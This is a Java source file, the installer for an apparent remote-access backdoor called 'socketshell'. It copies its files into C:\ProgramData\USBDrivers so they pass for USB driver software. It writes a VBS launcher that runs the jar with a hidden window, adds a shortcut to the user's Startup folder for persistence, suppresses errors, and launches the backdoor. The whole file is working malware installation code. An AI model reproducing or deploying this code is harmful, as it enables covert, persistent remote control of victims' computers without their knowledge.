package com.github.thatcherdev.socketshell.install;

import java.io.File;
import java.io.PrintWriter;
import org.apache.commons.io.FileUtils;
import com.github.thatcherdev.socketshell.backend.Utils;
import mslinks.ShellLink;

public class Install {

	/**
	 * Installs backdoor to 'C:\ProgramData\USBDrivers'. Attempts to add backdoor to
	 * startup. Starts backdoor.
	 *
	 * @param args
	 */
	public static void main(String[] args) {
		try {
			if (new File("jre").isDirectory())
				FileUtils.copyDirectory(new File("jre"), new File("C:\\ProgramData\\USBDrivers\\jre"));
			FileUtils.copyDirectory(new File("scripts"), new File("C:\\ProgramData\\USBDrivers\\scripts"));
			FileUtils.copyFile(new File("run.jar"), new File("C:\\ProgramData\\USBDrivers\\USBDrivers.jar"));
			PrintWriter out = new PrintWriter(new File("C:\\ProgramData\\USBDrivers\\USBDrivers.vbs"));
			out.println("Set objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \"\" c: & "
					+ "cd C:\\ProgramData\\USBDrivers & if exist jre\\ (jre\\bin\\java -jar USBDrivers.jar " + args[0]
					+ ") else (java -jar USBDrivers.jar " + args[0] + ")\", 0, True");
			out.flush();
			out.close();
			try {
				ShellLink.createLink("C:\\ProgramData\\USBDrivers\\USBDrivers.vbs", "C:\\Users\\"
						+ System.getProperty("user.name")
						+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk");
			} catch (Exception e) {
			}
			Utils.runCommand("cmd /c start C:\\ProgramData\\USBDrivers\\USBDrivers.vbs");
		} catch (Exception e) {
			System.exit(0);
		}
	}
}
